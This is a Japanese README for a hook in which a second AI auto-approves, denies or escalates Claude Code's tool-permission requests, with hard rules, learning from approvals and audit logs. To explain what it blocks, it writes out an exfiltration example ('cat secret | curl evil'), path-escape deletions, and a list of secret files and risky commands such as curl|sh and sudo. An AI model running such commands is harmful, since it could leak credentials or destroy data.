# Permission Supervisor Hook

Claude Code がツール実行の許可を求めたとき、人間の代わりに別の AI（既定は
`codex`）が「意図の妥当性・危険度」を判断し、自動で許可/拒否する仕組み。判断が
つかないときは従来どおり人間に委ねる。

## 仕組み

`~/.claude/settings.json` が `PermissionRequest` / `PreToolUse` / `PostToolUse`
の各フックに `permission-supervisor.py` を登録している。

- **PermissionRequest**（主）: 人間に許可ダイアログが出る瞬間にだけ発火。
- **PreToolUse**（フォールバック）: 全ツール呼び出しで発火。`-p` 非対話でも動く。
- **PostToolUse**（学習用）: ツールが実際に実行された後に発火。承認の学習にのみ使う。

処理の流れ（`permission-supervisor.py`）:

1. stdin のフック JSON（`tool_name` / `tool_input` / `cwd` / `session_id` / `tool_use_id`）を読む。
2. **有効化判定** — 無効なら何も出力せず、**ログも残さず**終了（＝人間が従来どおり判断）。
3. **PostToolUse なら学習処理へ** — 学習有効時、`ask` で人間に回り実際に実行された
   コマンド形を allowlist へ昇格して終了（後述「承認の学習」）。以降は PreToolUse /
   PermissionRequest の流れ。
4. **常に人間へ回すツール** — `AskUserQuestion` など、実ユーザーの回答が必要な
   ツール。既定は人間へエスカレーション。ただし `answer_user_questions: true`
   のときは judge に代理回答させる（後述「仕様質問への自動応答」）。
5. **scratch 書込/削除** — `/tmp`・`$TMPDIR` に閉じた編集/削除はハード規則より前に
   許可（後述「scratch ディレクトリの書込/削除」）。
6. **ハード規則** — 危険パターンに一致したら、AI の判断に関わらず必ず人間へ
   エスカレーション。
7. **常に許可するパターン** — skills スクリプト・信頼済み固定コマンド・read-only 操作・
   学習済みコマンド形は、バックエンドを通さず許可（後述「読み取りは許可」「承認の学習」）。
8. **審査バックエンド呼び出し** — `judge-codex.sh` にコンテキストを渡し、
   `{"decision":"allow|deny|ask","reason":"..."}` を得る。
9. `allow`/`deny` をフック JSON に変換して出力。`ask`・タイムアウト・エラーは
   **出力なし＝人間へ**。
10. `log_decisions` に含まれる判定だけ `logs/audit.jsonl` に追記（既定で `ask`=人間への
    エスカレーションを含む全判定を記録）。

## 有効化（オプトイン）

インストールしただけでは何もしない（`enabled: false`）。有効化する方法は3つ:

- **起動中トグル（推奨）**: `~/.claude/hooks/supervisor/permission-supervisor.py --on`
  （`--off` / `--toggle` / `--status` / `--list`）。状態ファイルを書き換えるだけで、
  フックは毎回読み直すため **Claude Code を再起動せずに即反映**される。
- 一時的: シェルで `export CLAUDE_SUPERVISOR=1`（`0` で強制無効）。
- 恒久的: `supervisor.json` の `"enabled": true`。

優先順位（高い順）: `CLAUDE_SUPERVISOR` env ＞ 状態ファイル ＞ `supervisor.json`。

### 状態ファイル（起動中の切り替え・プロジェクト単位）

フックは毎回新しいプロセスで起動するため、env 直値はセッション開始時に固定され
起動中に変えられない。そこで **状態ファイル**を毎回読み込み、`enabled` をはじめ
任意の設定キーをライブ上書きできる。

状態ファイルは既定で **プロジェクト（git リポジトリ）単位**に分かれる。これにより
複数プロジェクトを並行実行しても、各プロジェクトで独立にトグルできる（リポA で
`--on` してもリポB のセッションには影響しない）。

- パス解決（フック・CLI 共通）:
  1. 環境変数 `CLAUDE_SUPERVISOR_STATE_FILE` が指定されていれば **そのパスをそのまま**
     使用（共有用。複数セッションをまとめて切り替えたいとき向け）。
  2. 未指定なら `logs/state/<プロジェクト名>-<ハッシュ>.json`。キーは作業ディレクトリ
     の **プロジェクトルート**に正規化される。VCS ルート（`.git`/`.hg`/`.jj`/`.svn`）を
     優先し、無ければ最寄りのプロジェクトマーカー（`pyproject.toml`/`package.json`/
     `Cargo.toml`/`go.mod` 等）のあるディレクトリ。どちらも無い非 VCS プロジェクトは
     cwd 単位になる（サブディレクトリごとに別ファイルになりうる点に注意）。
- `--on/--off/--toggle` は **実行したディレクトリのプロジェクト**の状態を書き換える。
- 手で `{"enabled": true, "answer_user_questions": true}` 等を書いてもよい。
  `supervisor.json` の上に重ねられる。
- `logs/`（state/ と audit.jsonl）は chezmoi 管理外・実行時生成。

```sh
SUP=~/.claude/hooks/supervisor/permission-supervisor.py
# セッション内では ! 接頭辞でそのプロジェクトの cwd から実行するのが手軽
python3 "$SUP" --on       # このプロジェクトで即有効化
python3 "$SUP" --status   # このプロジェクトの状態・解決先パスを表示
python3 "$SUP" --list     # 全プロジェクトの ON/OFF 一覧
python3 "$SUP" --off      # このプロジェクトで無効化

# 仕様質問の代理回答（answer_user_questions）も同様にプロジェクト単位で起動中トグル
python3 "$SUP" --answers-on      # judge が AskUserQuestion を代理回答
python3 "$SUP" --answers-off     # 質問は人間へ（既定）
python3 "$SUP" --answers-toggle

# 承認の学習（learn_from_approvals）もプロジェクト単位でトグル・確認・破棄
python3 "$SUP" --learn-on        # ask→人間 allow したコマンド形を学習
python3 "$SUP" --learn-off       # 学習を止める（既定）
python3 "$SUP" --list-learned    # 学習済みコマンド形の一覧
python3 "$SUP" --forget-learned "git log"   # 特定形を破棄（引数必須）
python3 "$SUP" --forget-learned --all       # 全消去（明示時のみ。引数なしはエラー）

# 複数セッションをまとめて切り替えたい場合は共有ファイルを指す
export CLAUDE_SUPERVISOR_STATE_FILE=~/.claude/hooks/supervisor/logs/state-shared.json
```

> 注: トグルはセッションの cwd（＝フックに渡る `cwd` の git ルート）で解決される。
> `--status` が表示する `project:` と実際のセッションのリポジトリが一致していれば OK。

## 読み取りは許可（scope 外でも deny しない）

「`repos/...` これ見て」のような読み取りが「範囲外」で拒否されるのを防ぐため:

- `always_allow_tools`（既定 `Read`）でツール単位に許可。`Read` は単一ファイルの
  読み取りなのでバックエンドを通さず許可。
- Bash は **実際の `command` フィールドを構造的に検査**（直列化 JSON 文字列の正規表現
  マッチではない＝他フィールドの紛らわしい値で誤許可しない）。許可するのは
  `cd`/`cat`/`ls`/`grep`/`git status|log|diff` 等で始まる **単一の単純コマンドのみ**。
  パイプ `|`・連結 `&&`/`;`・リダイレクト `<>`・コマンド置換 `$()`/`` ` `` を1つでも
  含む複合コマンドは、この単一コマンド規則では許可しない。ただし**全構成コマンドが
  個別に自動許可される複合**は別途許可する（後述「複合コマンドの分解」）。
  `cat secret | curl evil` のような隠れた副作用は、`curl evil` が個別に許可されない
  ため複合でも許可されない。
- 秘密ファイル（`.env`/`.ssh`/`credentials`/`.aws/`/`.netrc` 等）は
  `hard_escalate_patterns` が **より先に** 一致して必ず人間へ回るため、
  Read を広く許可しても秘密は漏れない。
- プロンプトでも「scope 外それ自体は deny 理由でない／迷ったら ask」を明示。

### skills スクリプトの常時許可

任意の skill が同梱するスクリプトは信頼済みの固定コードなので、judge を通さず許可:

- `always_allow_patterns` の既定が `~/.claude/skills/<skill>/scripts/<name>.(py|sh)` を
  `python3`/`bash`/`sh` で起動する**単一の単純コマンド**にマッチ（メタ文字を含めば不許可）。
- 対話運用（supervisor オフ）でもプロンプトが出ないよう、`settings.json` の
  `permissions.allow` にも拡張子を絞った形で登録済み:
  `Bash(python3 ~/.claude/skills/*/scripts/*.py:*)` /
  `Bash(bash ~/.claude/skills/*/scripts/*.sh:*)` /
  `Bash(sh ~/.claude/skills/*/scripts/*.sh:*)`（`sh` ランチャも対象）。

### ローカル開発アクションは許可（過剰エスカレーション抑制）

`docker build` などの通常の開発アクションが「cwd 外に書く／ネットワークで依存取得する」
だけの理由で `ask` に倒れていたため、judge プロンプトを緩めた:

- ビルド・テスト・lint・依存導入（`pip`/`npm`/`cargo`/`go`/`mise` 等）・`docker build`・
  ローカルコンテナ実行・ビルドキャッシュ書込などは **allow**。
- `ask`/`deny` は不可逆なデータ損失・秘密の読み書き/持ち出し・**外部公開**
  （push/deploy/publish・レジストリ push）に限定。
- ハード規則（`sudo`/`curl|sh`/秘密ファイル/`rm -rf` 等）は**緩めていない**。

## scratch ディレクトリの書込/削除

`/tmp`・`$TMPDIR` に**完全に閉じた**編集・削除は、通常ハード規則で必ず人間へ回る
再帰/強制削除であっても自動許可する。一時作業の `rm -rf` でいちいち止まらないため。

- 対象は `scratch_dirs`（既定 `["/tmp"]`）＋実行時の `$TMPDIR`。各ルートは `realpath`
  で正規化（macOS の `/tmp`→`/private/tmp`、`$TMPDIR`→`/private/var/folders/...` を解決）。
- `matches_scratch_allow` は**ハード規則より前**に評価。条件は厳格:
  - `Edit`/`Write`/`NotebookEdit`: 対象パスが scratch ルート**配下**（ルート自身は不可）。
  - `Bash`: 単一の単純コマンド（メタ文字・グロブ/チルダを含めば不可）で、動詞が
    `{rm, mv, cp, mkdir, rmdir, touch}` のみ。**全オペランド**を `realpath` 解決して
    scratch 配下に厳密包含。`..` による脱出・ルート自身の指定・scratch 外パスは拒否。
- シンボリックリンクは `realpath` で実体解決後に判定するため、scratch 内リンクが外を
  指していても包含されない（＝許可されない）。
- **環境変数展開を含む Bash は対象外**: `$` はメタ文字として弾かれるため、
  `rm -rf "$TMPDIR/x"` のような書き方は scratch_allow に乗らず人間へエスカレーション
  される（展開後パスを静的に検査できないため）。scratch 自動許可させたいときは
  `rm -rf /tmp/x` のように**実パスで**指定する。
- 例: `rm -rf /tmp/build` は許可、`rm -rf /tmp`（ルート自身）・`rm -rf /tmp/../etc`・
  `cp /etc/passwd /tmp/x`（scratch 外を含む）は従来どおり人間へ。

## 複合コマンドの分解（compound allow）

「Enter を押すだけの人間の置き換え」が目的で、原則は **「許可されたコマンドの複合は
許可される」**。改行や `&&`/`;`/`|` を含む複合コマンド（例 `cd dir && <skill スクリプト>`、
`cd dir; <学習済みコマンド>`）が毎回 `ask` に倒れないよう、トップレベルを単純コマンドの
列に分解し、各セグメントに**単一行と同じ判定**（`scratch → ハード規則 → always_allow`）を
適用する。**全セグメントが自動許可なら複合も許可**（`stage="compound_allow"`）。

- **AND 評価**: 1つでも自動許可でないセグメントがあれば複合許可は成立せず、何も出力
  せず既存フロー（全文ハード規則 → backend）へ委ねる（フェイルセーフ）。ハード規則に
  当たるセグメントを含む複合は全文ハード規則が必ず人間へ回す。
- **ハード規則より前に評価**: scratch と同様、複合許可チェックは全文ハード規則より前。
  これにより `cd /tmp/x && rm -rf /tmp/x/build` のような scratch 限定の再帰削除を含む
  複合も正しく通る。
- **分解できない構文は従来どおりエスカレーション**: クォート外に以下を1つでも含む複合は
  分解を中止し（`None`）、judge/人間へ回す。per-segment で安全性を検査できないため。
  - コマンド/プロセス置換 `$(...)` / バッククォート
  - 変数展開 `$VAR`/`$TMPDIR`（この版では非対応。実パス指定なら通る）
  - リダイレクト `>` `>>` `<`（`&>`・ヒアドキュメント `<<` 含む。書込先を検査できない）
  - サブシェル/グルーピング `(...)` `{...}`、ブレース展開
  - クォートのバランスが取れていない場合も分解中止
- **クォートは尊重**: 単/二重クォートと `\` エスケープを追跡し、クォート内の `;`/`|`/`&`
  は分割点にしない（例 `grep "a;b" file` は分割されない）。
- **`cd` を追跡して評価 cwd を更新**: 複合の途中で `cd` するとそれ以降のセグメントは
  新しい cwd で判定する（scratch 包含判定を実際の実行と一致させるため）。例えば
  `/tmp/x` から `cd / && rm -rf etc` を評価すると、`rm` は `/etc`（scratch 外）と解決され
  自動許可されない。`cd` 先を厳密に解決できない場合（`cd -`/OLDPWD・オプション付き・
  複数引数・`~`・cwd 不明の相対パス）は複合許可を**中止**（フェイルセーフ）。
- **学習は部品（単純コマンド）単位のまま**。複合自体は学習しない。`learn_from_approvals`
  が進むほど複合の自動許可範囲が自然に拡大する（学習済みセグメントを含む複合が通る）。
- **後方互換**: 単一の単純コマンドは従来どおり単一コマンド規則で判定される（複合許可は
  2セグメント以上のときだけ作用）。

## 承認の学習（learn_from_approvals）

`learn_from_approvals: true`（既定 false）のとき、judge が `ask` に回し**人間が
allow した**コマンドの「形」を学習し、以後の同系統コマンドを自動許可する。

- **検知**: `PostToolUse` はツールが実際に実行された後にのみ発火する。supervisor が
  `ask`（出力なし）にした呼び出しが PostToolUse まで到達した＝人間が許可した、と判定。
- **流れ**: backend が `ask` のとき `tool_use_id` をキーに正規化シグネチャを pending
  ストアへ記録 → 同 `tool_use_id` の PostToolUse で（ハード規則再チェックを通過した
  場合のみ）学習 allowlist へ昇格・`count++`。
- **正規化シグネチャ**: 単一の単純コマンドのみ対象。`argv[0]`（`git`/`gh`/`cargo`/
  `npm`/`docker`/`mise` 等はサブコマンド `argv[1]` まで）を骨格にし引数は捨てる
  （例 `git log --oneline -20` → `git log`）。`docker`/`gh` のようにグループを持つ
  多段 CLI は2段目まで残す（`docker image ls` → `docker image ls` なので
  `docker image rm` を巻き込まない、`gh pr view 123` → `gh pr view`）。メタ文字・
  グロブ/チルダを含むコマンドは学習しない。
- **過度に広いシグネチャは学習しない**: サブコマンド系ツールでサブコマンドの直前に
  グローバルオプションが来る場合（例 `git -C /path log`）は形が曖昧なので学習しない
  （裸の `git` に縮退させて無関係な `git push` まで許可してしまうのを防ぐ）。
- **外部公開系は決して学習しない**: `git push`/`git fetch`/`git pull`・`gh pr create`/
  `gh pr merge`/`gh release create`・`docker push`・`npm/pnpm/yarn/cargo/poetry publish`・
  `kubectl apply/delete` 等の push/publish/外向き操作は、一度人間が許可しても自動学習
  されない（先頭語で判定し、学習・許可マッチの両方で弾く）。
- **安全**: ハード規則は学習より先に評価されるため、学習済み形が危険系を上書きする
  ことはない。昇格時にもハード規則を再チェックし、一致する形は決して学習しない。
- **保存先**: `logs/learned/<proj>-<hash>.json`（プロジェクト単位・chezmoi 管理外・
  実行時生成）。pending は `logs/learned/pending/` 配下で1時間で間引き。
- **確認/破棄**: `--list-learned` で一覧、`--forget-learned <sig>` で特定形を破棄、
  `--forget-learned --all` で全消去（引数必須。引数なしはエラーで、誤って全消去しない）。
  `--status` に有効/無効と学習件数を表示。

## 監査ログ（エスカレーション追跡）

ログの主目的は **人間へのエスカレーション（`ask`）の追跡**。「ほとんどの呼び出しは
自動許可される」前提のため、`ask` はノイズではなく数少ない重要シグナルとみなす。

- `log_decisions`（既定 `["allow","deny","answer","ask"]`）に含まれる判定を記録。
  既定で `ask` を含む全判定を残す＝**全エスカレーションが監査可能**。`ask` には
  ハード規則エスカレーション・backend の `ask`・`AskUserQuestion` の3経路すべてが
  入り、各行の `stage`（`hard_rule`/`backend`/`always_ask_tool` 等）で区別できる。
- 特定の判定をあえて落としたい場合のみ `log_decisions` から外す。
- **無効時は1行も書かない**（supervisor が何も判断しないため。`stage="disabled"`
  の記録は廃止済み）。

## 仕様質問への自動応答（無人運用向け）

`answer_user_questions: true` のとき、`always_ask_tools`（既定 `AskUserQuestion`）
を人間へ回す代わりに judge へ回答させる。

- judge は `mode:"answer"` のコンテキストと `prompt-answer-template.md` を使い
  `{"decision":"answer","answer":"...","reason":"..."}` を返す契約。
- フックはツール呼び出しを `deny` し、選んだ回答を理由文としてモデルへ返す
  （フックには回答を返す専用チャネルが無いため）。モデルは「supervisor が代理
  回答した」と解釈して再質問せず続行する。
- judge が回答不能（`ask`）なら従来どおり人間へ。**既定は false**（対話運用では
  従来どおり人間が答える）。オフロード/headless 運用で有効化する想定。

## 設定 `supervisor.json`

| キー | 意味 |
| --- | --- |
| `enabled` | 既定の有効/無効。 |
| `backend` | 審査バックエンドのスクリプト（相対なら本ディレクトリ基準、絶対パス可）。 |
| `backend_timeout_seconds` | バックエンドのタイムアウト秒。超過で人間へ。 |
| `answer_user_questions` | true で `always_ask_tools` を judge が代理回答（既定 false）。 |
| `learn_from_approvals` | true で `ask`→人間 allow したコマンド形を学習し以後自動許可（既定 false）。 |
| `scratch_dirs` | ここに閉じた書込/削除を許可するルートの配列（既定 `["/tmp"]`、`$TMPDIR` を実行時追加）。 |
| `log_decisions` | 監査ログに残す判定の配列（既定 `["allow","deny","answer","ask"]`。既定で `ask`=全エスカレーションを記録）。 |
| `always_allow_tools` | バックエンドを通さず許可するツール名の配列（既定 `Read`）。 |
| `always_allow_patterns` | Bash の `command` フィールドに対して許可する正規表現の配列（単一の単純コマンドのみ）。既定で全 skills スクリプトを含む。ハード規則が先に勝つ。 |
| `always_ask_tools` | 常に人間へ回す（または代理回答する）ツール名の配列。 |
| `hard_escalate_patterns` | これに一致したら常に人間へ回す正規表現の配列。 |

## バックエンドの差し替え

`backend` は `{"decision":...,"reason":...}` を stdout に返す任意の実行ファイルに
変更できる（stdin にコンテキスト JSON を受け取る契約）。`mode:"answer"` のときは
`{"decision":"answer","answer":...,"reason":...}` を返す。同梱:

- `judge-codex.sh` — 既定。`prompt-template.md`（判定）/ `prompt-answer-template.md`
  （回答）を `mode` で切り替えて `codex exec` で実行。
- `judge-mock.sh` — テスト用。環境変数で固定 verdict（`answer` 含む）を返す。

環境変数 `CLAUDE_SUPERVISOR_BACKEND` を設定すると `supervisor.json` の `backend`
を上書きできる（テストや一時利用向け）。

## 安全設計

- **オプトイン**（既定オフ）。
- **ハード規則**で危険カテゴリは AI が allow と言っても必ず人間へ:
  再帰/強制削除（`rm` の `-r`/`-R`/`-f`/`--recursive`/`--force`、フラグ順不同）、
  `git reset --hard`、force push、`sudo`、`curl|sh`、資格情報・鍵・秘密ファイルなど。
- **明示的な短絡**: `AskUserQuestion` は人間へ（または代理回答）、`Read`・安全な
  read-only Bash・信頼済み `python3 ~/.claude/skills/pr-review/scripts/*.py` は許可。
- **代理回答も deny で実装**: 自動応答は allow ではなく deny+理由で行うため、
  質問ツールが暗黙に実行されることはない。`answer` verdict は質問ツール以外の
  経路では `ask` に丸められる（誤作動で勝手に実行されない）。
- **フェイルセーフ**: 不確実・タイムアウト・エラーは一切 allow に倒さず人間へ。
- **scratch 許可はハード規則の限定例外**: `rm -rf` 等を許可するのは `/tmp`・`$TMPDIR`
  に `realpath` で厳密包含される操作のみ。`..`/シンボリックリンクで外へ抜ける指定や
  scratch 外パスを含むコマンドは従来どおり人間へ。
- **学習はハード規則を上書きしない**: ハード規則が学習より先に評価され、昇格時にも
  再チェックするため、危険系コマンド形が自動許可されることはない。
- **複合許可は per-segment 判定の AND**: 全構成コマンドが個別に自動許可されるときだけ
  複合を許可。1つでも未許可・ハード規則該当・分解不可構文を含めば従来どおり judge/
  人間へ。危険なセグメントは個別に弾かれるため複合経由で漏れない。
- **監査ログ** `logs/audit.jsonl`（chezmoi 管理外、実行時生成）。無効時は1行も書かず、
  `log_decisions` に含まれる判定のみ記録（既定で `ask`=全エスカレーションを含む）。各行に
  `session_id` / `tool_use_id` / `transcript_path`、Bash では
  `bash_command` / `bash_command_sha256` / `bash_description` も残す。
  長いコマンドは 20,000 文字で切り詰める。

## 注意

- この `settings.json` は chezmoi 管理。`/config` でのテーマ変更等はここで管理
  する（`chezmoi apply` で上書きされるため）。
- フックに会話履歴は渡らない。審査 AI が見られるのはツール情報＋cwd のみで、
  文脈は限定的。だからこそ「迷ったら人間へ」の設計になっている。
